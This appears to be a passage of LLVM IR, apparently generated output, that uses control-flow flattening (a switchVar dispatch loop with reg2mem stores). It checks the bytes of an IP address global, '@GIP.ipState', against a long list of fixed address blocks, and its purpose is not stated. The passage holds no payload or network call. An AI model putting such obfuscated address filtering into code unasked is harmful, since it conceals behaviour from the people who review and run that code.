  br label %loopEnd

; <label>:1259:                                   ; preds = %loopEntry
  %1260 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1261 = zext i8 %1260 to i32
  %1262 = icmp eq i32 %1261, 236
  %1263 = select i1 %1262, i32 -1813357520, i32 763334861
  store i32 %1263, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1264:                                   ; preds = %loopEntry
  %1265 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1266 = zext i8 %1265 to i32
  %1267 = icmp eq i32 %1266, 107
  %1268 = select i1 %1267, i32 -1073291042, i32 -506650699
  store i32 %1268, i32* %switchVar
  br label %loopEnd

; <label>:1269:                                   ; preds = %loopEntry
  %1270 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1271 = zext i8 %1270 to i32
  %1272 = icmp eq i32 %1271, 170
  %1273 = select i1 %1272, i32 -1813357520, i32 -506650699
  store i32 %1273, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1274:                                   ; preds = %loopEntry
  %1275 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1276 = zext i8 %1275 to i32
  %1277 = icmp eq i32 %1276, 138
  %1278 = select i1 %1277, i32 -736459438, i32 1672134079
  store i32 %1278, i32* %switchVar
  br label %loopEnd

; <label>:1279:                                   ; preds = %loopEntry
  %1280 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1281 = zext i8 %1280 to i32
  %1282 = icmp eq i32 %1281, 197
  %1283 = select i1 %1282, i32 -1813357520, i32 1672134079
  store i32 %1283, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1284:                                   ; preds = %loopEntry
  %1285 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1286 = zext i8 %1285 to i32
  %1287 = icmp eq i32 %1286, 138
  %1288 = select i1 %1287, i32 1869489416, i32 -1053195439
  store i32 %1288, i32* %switchVar
  br label %loopEnd

; <label>:1289:                                   ; preds = %loopEntry
  %1290 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1291 = zext i8 %1290 to i32
  %1292 = icmp eq i32 %1291, 68
  %1293 = select i1 %1292, i32 -1813357520, i32 -1053195439
  store i32 %1293, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1294:                                   ; preds = %loopEntry
  %1295 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1296 = zext i8 %1295 to i32
  %1297 = icmp eq i32 %1296, 139
  %1298 = select i1 %1297, i32 -277746479, i32 1947631840
  store i32 %1298, i32* %switchVar
  br label %loopEnd

; <label>:1299:                                   ; preds = %loopEntry
  %1300 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1301 = zext i8 %1300 to i32
  %1302 = icmp eq i32 %1301, 59
  %1303 = select i1 %1302, i32 -1813357520, i32 1947631840
  store i32 %1303, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1304:                                   ; preds = %loopEntry
  %1305 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1306 = zext i8 %1305 to i32
  %1307 = icmp eq i32 %1306, 146
  %1308 = select i1 %1307, i32 1611538484, i32 1175217008
  store i32 %1308, i32* %switchVar
  br label %loopEnd

; <label>:1309:                                   ; preds = %loopEntry
  %1310 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1311 = zext i8 %1310 to i32
  %1312 = icmp eq i32 %1311, 185
  %1313 = select i1 %1312, i32 -1394161578, i32 1175217008
  store i32 %1313, i32* %switchVar
  br label %loopEnd

; <label>:1314:                                   ; preds = %loopEntry
  %1315 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1316 = zext i8 %1315 to i32
  %1317 = icmp sge i32 %1316, 128
  %1318 = select i1 %1317, i32 -1068933444, i32 1175217008
  store i32 %1318, i32* %switchVar
  br label %loopEnd

; <label>:1319:                                   ; preds = %loopEntry
  %1320 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1321 = zext i8 %1320 to i32
  %1322 = icmp slt i32 %1321, 191
  %1323 = select i1 %1322, i32 -1813357520, i32 1175217008
  store i32 %1323, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1324:                                   ; preds = %loopEntry
  %1325 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1326 = zext i8 %1325 to i32
  %1327 = icmp eq i32 %1326, 163
  %1328 = select i1 %1327, i32 27762033, i32 1637490172
  store i32 %1328, i32* %switchVar
  br label %loopEnd

; <label>:1329:                                   ; preds = %loopEntry
  %1330 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1331 = zext i8 %1330 to i32
  %1332 = icmp eq i32 %1331, 47
  %1333 = select i1 %1332, i32 -1695802251, i32 1637490172
  store i32 %1333, i32* %switchVar
  br label %loopEnd

; <label>:1334:                                   ; preds = %loopEntry
  %1335 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1336 = zext i8 %1335 to i32
  %1337 = icmp sge i32 %1336, 10
  %1338 = select i1 %1337, i32 -1050567120, i32 1637490172
  store i32 %1338, i32* %switchVar
  br label %loopEnd

; <label>:1339:                                   ; preds = %loopEntry
  %1340 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1341 = zext i8 %1340 to i32
  %1342 = icmp slt i32 %1341, 11
  %1343 = select i1 %1342, i32 -1813357520, i32 1637490172
  store i32 %1343, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1344:                                   ; preds = %loopEntry
  %1345 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1346 = zext i8 %1345 to i32
  %1347 = icmp eq i32 %1346, 174
  %1348 = select i1 %1347, i32 -973450089, i32 754555017
  store i32 %1348, i32* %switchVar
  br label %loopEnd

; <label>:1349:                                   ; preds = %loopEntry
  %1350 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1351 = zext i8 %1350 to i32
  %1352 = icmp eq i32 %1351, 138
  %1353 = select i1 %1352, i32 1714623169, i32 754555017
  store i32 %1353, i32* %switchVar
  br label %loopEnd

; <label>:1354:                                   ; preds = %loopEntry
  %1355 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1356 = zext i8 %1355 to i32
  %1357 = icmp sge i32 %1356, 1
  %1358 = select i1 %1357, i32 -1521003293, i32 754555017
  store i32 %1358, i32* %switchVar
  br label %loopEnd

; <label>:1359:                                   ; preds = %loopEntry
  %1360 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1361 = zext i8 %1360 to i32
  %1362 = icmp slt i32 %1361, 127
  %1363 = select i1 %1362, i32 -1813357520, i32 754555017
  store i32 %1363, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1364:                                   ; preds = %loopEntry
  %1365 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1366 = zext i8 %1365 to i32
  %1367 = icmp eq i32 %1366, 192
  %1368 = select i1 %1367, i32 -445927035, i32 -703041845
  store i32 %1368, i32* %switchVar
  br label %loopEnd

; <label>:1369:                                   ; preds = %loopEntry
  %1370 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1371 = zext i8 %1370 to i32
  %1372 = icmp eq i32 %1371, 241
  %1373 = select i1 %1372, i32 982214186, i32 -703041845
  store i32 %1373, i32* %switchVar
  br label %loopEnd

; <label>:1374:                                   ; preds = %loopEntry
  %1375 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1376 = zext i8 %1375 to i32
  %1377 = icmp sge i32 %1376, 128
  %1378 = select i1 %1377, i32 311869037, i32 -703041845
  store i32 %1378, i32* %switchVar
  br label %loopEnd

; <label>:1379:                                   ; preds = %loopEntry
  %1380 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1381 = zext i8 %1380 to i32
  %1382 = icmp slt i32 %1381, 255
  %1383 = select i1 %1382, i32 -1813357520, i32 -703041845
  store i32 %1383, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1384:                                   ; preds = %loopEntry
  %1385 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1386 = zext i8 %1385 to i32
  %1387 = icmp eq i32 %1386, 198
  %1388 = select i1 %1387, i32 199443080, i32 1174323419
  store i32 %1388, i32* %switchVar
  br label %loopEnd

; <label>:1389:                                   ; preds = %loopEntry
  %1390 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1391 = zext i8 %1390 to i32
  %1392 = icmp eq i32 %1391, 199
  %1393 = select i1 %1392, i32 -1913688160, i32 1174323419
  store i32 %1393, i32* %switchVar
  br label %loopEnd

; <label>:1394:                                   ; preds = %loopEntry
  %1395 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1396 = zext i8 %1395 to i32
  %1397 = icmp sge i32 %1396, 64
  %1398 = select i1 %1397, i32 1817495959, i32 1174323419
  store i32 %1398, i32* %switchVar
  br label %loopEnd

; <label>:1399:                                   ; preds = %loopEntry
  %1400 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1401 = zext i8 %1400 to i32
  %1402 = icmp slt i32 %1401, 127
  %1403 = select i1 %1402, i32 -1813357520, i32 1174323419
  store i32 %1403, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1404:                                   ; preds = %loopEntry
  %1405 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1406 = zext i8 %1405 to i32
  %1407 = icmp eq i32 %1406, 198
  %1408 = select i1 %1407, i32 -2005786399, i32 -1462469020
  store i32 %1408, i32* %switchVar
  br label %loopEnd

; <label>:1409:                                   ; preds = %loopEntry
  %1410 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1411 = zext i8 %1410 to i32
  %1412 = icmp eq i32 %1411, 211
  %1413 = select i1 %1412, i32 1553084156, i32 -1462469020
  store i32 %1413, i32* %switchVar
  br label %loopEnd

; <label>:1414:                                   ; preds = %loopEntry
  %1415 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1416 = zext i8 %1415 to i32
  %1417 = icmp sge i32 %1416, 96
  %1418 = select i1 %1417, i32 1932968507, i32 -1462469020
  store i32 %1418, i32* %switchVar
  br label %loopEnd

; <label>:1419:                                   ; preds = %loopEntry
  %1420 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1421 = zext i8 %1420 to i32
  %1422 = icmp slt i32 %1421, 127
  %1423 = select i1 %1422, i32 -1813357520, i32 -1462469020
  store i32 %1423, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1424:                                   ; preds = %loopEntry
  %1425 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1426 = zext i8 %1425 to i32
  %1427 = icmp eq i32 %1426, 207
  %1428 = select i1 %1427, i32 1036598195, i32 214972406
  store i32 %1428, i32* %switchVar
  br label %loopEnd

; <label>:1429:                                   ; preds = %loopEntry
  %1430 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1431 = zext i8 %1430 to i32
  %1432 = icmp eq i32 %1431, 154
  %1433 = select i1 %1432, i32 -571155608, i32 214972406
  store i32 %1433, i32* %switchVar
  br label %loopEnd

; <label>:1434:                                   ; preds = %loopEntry
  %1435 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1436 = zext i8 %1435 to i32
  %1437 = icmp sge i32 %1436, 192
  %1438 = select i1 %1437, i32 961014986, i32 214972406
  store i32 %1438, i32* %switchVar
  br label %loopEnd

; <label>:1439:                                   ; preds = %loopEntry
  %1440 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1441 = zext i8 %1440 to i32
  %1442 = icmp slt i32 %1441, 255
  %1443 = select i1 %1442, i32 -1813357520, i32 214972406
  store i32 %1443, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1444:                                   ; preds = %loopEntry
  %1445 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1446 = zext i8 %1445 to i32
  %1447 = icmp eq i32 %1446, 37
  %1448 = select i1 %1447, i32 112802370, i32 -810251471
  store i32 %1448, i32* %switchVar
  br label %loopEnd

; <label>:1449:                                   ; preds = %loopEntry
  %1450 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1451 = zext i8 %1450 to i32
  %1452 = icmp eq i32 %1451, 139
  %1453 = select i1 %1452, i32 -113167314, i32 -810251471
  store i32 %1453, i32* %switchVar
  br label %loopEnd

; <label>:1454:                                   ; preds = %loopEntry
  %1455 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1456 = zext i8 %1455 to i32
  %1457 = icmp sge i32 %1456, 1
  %1458 = select i1 %1457, i32 -425613596, i32 -810251471
  store i32 %1458, i32* %switchVar
  br label %loopEnd

; <label>:1459:                                   ; preds = %loopEntry
  %1460 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1461 = zext i8 %1460 to i32
  %1462 = icmp slt i32 %1461, 31
  %1463 = select i1 %1462, i32 -1813357520, i32 -810251471
  store i32 %1463, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1464:                                   ; preds = %loopEntry
  %1465 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1466 = zext i8 %1465 to i32
  %1467 = icmp eq i32 %1466, 67
  %1468 = select i1 %1467, i32 894573310, i32 1519583503
  store i32 %1468, i32* %switchVar
  br label %loopEnd

; <label>:1469:                                   ; preds = %loopEntry
  %1470 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1471 = zext i8 %1470 to i32
  %1472 = icmp eq i32 %1471, 207
  %1473 = select i1 %1472, i32 -715730583, i32 1519583503
  store i32 %1473, i32* %switchVar
  br label %loopEnd

; <label>:1474:                                   ; preds = %loopEntry
  %1475 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1476 = zext i8 %1475 to i32
  %1477 = icmp sge i32 %1476, 64
  %1478 = select i1 %1477, i32 1514329698, i32 1519583503
  store i32 %1478, i32* %switchVar
  br label %loopEnd

; <label>:1479:                                   ; preds = %loopEntry
  %1480 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1481 = zext i8 %1480 to i32
  %1482 = icmp slt i32 %1481, 95
  %1483 = select i1 %1482, i32 -1813357520, i32 1519583503
  store i32 %1483, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1484:                                   ; preds = %loopEntry
  %1485 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1486 = zext i8 %1485 to i32
  %1487 = icmp eq i32 %1486, 67
  %1488 = select i1 %1487, i32 -1232553874, i32 -1794728042
  store i32 %1488, i32* %switchVar
  br label %loopEnd

; <label>:1489:                                   ; preds = %loopEntry
  %1490 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1491 = zext i8 %1490 to i32
  %1492 = icmp eq i32 %1491, 205
  %1493 = select i1 %1492, i32 1282571388, i32 -1794728042
  store i32 %1493, i32* %switchVar
  br label %loopEnd

; <label>:1494:                                   ; preds = %loopEntry
  %1495 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1496 = zext i8 %1495 to i32
  %1497 = icmp sge i32 %1496, 128
  %1498 = select i1 %1497, i32 -1922033534, i32 -1794728042
  store i32 %1498, i32* %switchVar
  br label %loopEnd

; <label>:1499:                                   ; preds = %loopEntry
  %1500 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1501 = zext i8 %1500 to i32
  %1502 = icmp slt i32 %1501, 191
  %1503 = select i1 %1502, i32 -1813357520, i32 -1794728042
  store i32 %1503, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1504:                                   ; preds = %loopEntry
  %1505 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1506 = zext i8 %1505 to i32
  %1507 = icmp eq i32 %1506, 80
  %1508 = select i1 %1507, i32 1155506957, i32 -865486498
  store i32 %1508, i32* %switchVar
  br label %loopEnd

; <label>:1509:                                   ; preds = %loopEntry
  %1510 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1511 = zext i8 %1510 to i32
  %1512 = icmp eq i32 %1511, 240
  %1513 = select i1 %1512, i32 -1977391818, i32 -865486498
  store i32 %1513, i32* %switchVar
  br label %loopEnd

; <label>:1514:                                   ; preds = %loopEntry
  %1515 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1516 = zext i8 %1515 to i32
  %1517 = icmp sge i32 %1516, 128
  %1518 = select i1 %1517, i32 234450928, i32 -865486498
  store i32 %1518, i32* %switchVar
  br label %loopEnd

; <label>:1519:                                   ; preds = %loopEntry
  %1520 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1521 = zext i8 %1520 to i32
  %1522 = icmp slt i32 %1521, 143
  %1523 = select i1 %1522, i32 -1813357520, i32 -865486498
  store i32 %1523, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1524:                                   ; preds = %loopEntry
  %1525 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1526 = zext i8 %1525 to i32
  %1527 = icmp eq i32 %1526, 82
  %1528 = select i1 %1527, i32 817020480, i32 732156049
  store i32 %1528, i32* %switchVar
  br label %loopEnd

; <label>:1529:                                   ; preds = %loopEntry
  %1530 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1531 = zext i8 %1530 to i32
  %1532 = icmp eq i32 %1531, 196
  %1533 = select i1 %1532, i32 -1854041652, i32 732156049
  store i32 %1533, i32* %switchVar
  br label %loopEnd

; <label>:1534:                                   ; preds = %loopEntry
  %1535 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1536 = zext i8 %1535 to i32
  %1537 = icmp sge i32 %1536, 1
  %1538 = select i1 %1537, i32 -1095605985, i32 732156049
  store i32 %1538, i32* %switchVar
  br label %loopEnd

; <label>:1539:                                   ; preds = %loopEntry
  %1540 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1541 = zext i8 %1540 to i32
  %1542 = icmp slt i32 %1541, 15
  %1543 = select i1 %1542, i32 -1813357520, i32 732156049
  store i32 %1543, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1544:                                   ; preds = %loopEntry
  %1545 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1546 = zext i8 %1545 to i32
  %1547 = icmp eq i32 %1546, 95
  %1548 = select i1 %1547, i32 -1595985938, i32 393884121
  store i32 %1548, i32* %switchVar
  br label %loopEnd

; <label>:1549:                                   ; preds = %loopEntry
  %1550 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1551 = zext i8 %1550 to i32
  %1552 = icmp eq i32 %1551, 85
  %1553 = select i1 %1552, i32 -344987216, i32 393884121
  store i32 %1553, i32* %switchVar
  br label %loopEnd

; <label>:1554:                                   ; preds = %loopEntry
  %1555 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1556 = zext i8 %1555 to i32
  %1557 = icmp sge i32 %1556, 8
  %1558 = select i1 %1557, i32 -1856774222, i32 393884121
  store i32 %1558, i32* %switchVar
  br label %loopEnd

; <label>:1559:                                   ; preds = %loopEntry
  %1560 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1561 = zext i8 %1560 to i32
  %1562 = icmp slt i32 %1561, 63
  %1563 = select i1 %1562, i32 -1813357520, i32 393884121
  store i32 %1563, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1564:                                   ; preds = %loopEntry
  %1565 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1566 = zext i8 %1565 to i32
  %1567 = icmp eq i32 %1566, 64
  %1568 = select i1 %1567, i32 951260768, i32 1647546576
  store i32 %1568, i32* %switchVar
  br label %loopEnd

; <label>:1569:                                   ; preds = %loopEntry
  %1570 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1571 = zext i8 %1570 to i32
  %1572 = icmp eq i32 %1571, 237
  %1573 = select i1 %1572, i32 -1231632916, i32 1647546576
  store i32 %1573, i32* %switchVar
  br label %loopEnd

; <label>:1574:                                   ; preds = %loopEntry
  %1575 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1576 = zext i8 %1575 to i32
  %1577 = icmp sge i32 %1576, 32
  %1578 = select i1 %1577, i32 2119490849, i32 1647546576
  store i32 %1578, i32* %switchVar
  br label %loopEnd

; <label>:1579:                                   ; preds = %loopEntry
  %1580 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1581 = zext i8 %1580 to i32
  %1582 = icmp slt i32 %1581, 43
  %1583 = select i1 %1582, i32 -1813357520, i32 1647546576
  store i32 %1583, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1584:                                   ; preds = %loopEntry
  %1585 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1586 = zext i8 %1585 to i32
  %1587 = icmp eq i32 %1586, 185
  %1588 = select i1 %1587, i32 991932887, i32 -1787237624
  store i32 %1588, i32* %switchVar
  br label %loopEnd

; <label>:1589:                                   ; preds = %loopEntry
  %1590 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1591 = zext i8 %1590 to i32
  %1592 = icmp eq i32 %1591, 92
  %1593 = select i1 %1592, i32 78032640, i32 -1787237624
  store i32 %1593, i32* %switchVar
  br label %loopEnd

; <label>:1594:                                   ; preds = %loopEntry
  %1595 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1596 = zext i8 %1595 to i32
  %1597 = icmp sge i32 %1596, 220
  %1598 = select i1 %1597, i32 596592512, i32 -1787237624
  store i32 %1598, i32* %switchVar
  br label %loopEnd

; <label>:1599:                                   ; preds = %loopEntry
  %1600 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1601 = zext i8 %1600 to i32
  %1602 = icmp slt i32 %1601, 223
  %1603 = select i1 %1602, i32 -1813357520, i32 -1787237624
  store i32 %1603, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1604:                                   ; preds = %loopEntry
  %1605 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1606 = zext i8 %1605 to i32
  %1607 = icmp eq i32 %1606, 104
  %1608 = select i1 %1607, i32 1517155849, i32 665034620
  store i32 %1608, i32* %switchVar
  br label %loopEnd

; <label>:1609:                                   ; preds = %loopEntry
  %1610 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1611 = zext i8 %1610 to i32
  %1612 = icmp eq i32 %1611, 238
  %1613 = select i1 %1612, i32 -1104261095, i32 665034620
  store i32 %1613, i32* %switchVar
  br label %loopEnd

; <label>:1614:                                   ; preds = %loopEntry
  %1615 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1616 = zext i8 %1615 to i32
  %1617 = icmp sge i32 %1616, 128
  %1618 = select i1 %1617, i32 1618971496, i32 665034620
  store i32 %1618, i32* %switchVar
  br label %loopEnd

; <label>:1619:                                   ; preds = %loopEntry
  %1620 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1621 = zext i8 %1620 to i32
  %1622 = icmp slt i32 %1621, 191
  %1623 = select i1 %1622, i32 -1813357520, i32 665034620
  store i32 %1623, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1624:                                   ; preds = %loopEntry
  %1625 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1626 = zext i8 %1625 to i32
  %1627 = icmp eq i32 %1626, 209
  %1628 = select i1 %1627, i32 1236092398, i32 849741571
  store i32 %1628, i32* %switchVar
  br label %loopEnd

; <label>:1629:                                   ; preds = %loopEntry
  %1630 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1631 = zext i8 %1630 to i32
  %1632 = icmp eq i32 %1631, 222
  %1633 = select i1 %1632, i32 -970525612, i32 849741571
  store i32 %1633, i32* %switchVar
  br label %loopEnd

; <label>:1634:                                   ; preds = %loopEntry
  %1635 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1636 = zext i8 %1635 to i32
  %1637 = icmp sge i32 %1636, 1
  %1638 = select i1 %1637, i32 965827442, i32 849741571
  store i32 %1638, i32* %switchVar
  br label %loopEnd

; <label>:1639:                                   ; preds = %loopEntry
  %1640 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1641 = zext i8 %1640 to i32
  %1642 = icmp slt i32 %1641, 31
  %1643 = select i1 %1642, i32 -1813357520, i32 849741571
  store i32 %1643, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:1644:                                   ; preds = %loopEntry
  %1645 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %1646 = zext i8 %1645 to i32
  %1647 = icmp eq i32 %1646, 208
  %1648 = select i1 %1647, i32 -951687549, i32 357657725
  store i32 %1648, i32* %switchVar
  br label %loopEnd

; <label>:1649:                                   ; preds = %loopEntry
  %1650 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %1651 = zext i8 %1650 to i32
  %1652 = icmp eq i32 %1651, 167
  %1653 = select i1 %1652, i32 -1325803585, i32 357657725
  store i32 %1653, i32* %switchVar
  br label %loopEnd

; <label>:1654:                                   ; preds = %loopEntry
  %1655 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %1656 = zext i8 %1655 to i32
  %1657 = icmp sge i32 %1656, 232
  %1658 = select i1 %1657, i32 707950714, i32 357657725
  store i32 %1658, i32* %switchVar
  br label %loopEnd

; <label>:1659:                                   ; preds = %loopEntry
